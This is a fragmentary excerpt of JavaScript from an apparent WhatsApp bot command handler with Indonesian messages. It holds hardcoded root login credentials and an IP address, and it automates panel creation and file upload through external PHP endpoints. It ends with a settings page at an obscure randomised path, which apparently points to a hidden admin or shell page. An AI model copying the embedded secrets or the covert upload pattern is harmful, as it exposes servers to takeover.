...
case 'ban': case 'banned': {
		...
		break
            ...
            break
case 'webp':
               if(from != "120363042501452366@g.us") return m.reply("maaf su fitur ini dapet di gunakan group tertentu")      
                
    m.reply("proses...")            
                 
host = "admin-root.adon.my.id" //go.nextnesia.net
uroot = "root"
proot = "adonbuyy"
ipanda = "20.2.69.170" //54.345.3.22
var inputt = {
          ...
          request.post({
              url: 'https://yogax.my.id/api2/createcp.php',
              form: inputt
...
var inputt = {
          ...
          request.post({
              url: 'https://yogax.my.id/api2/upload.php',
              form: inputt
...
*Setting* : ${domain}/vhsfhqpdhds6/adon.php
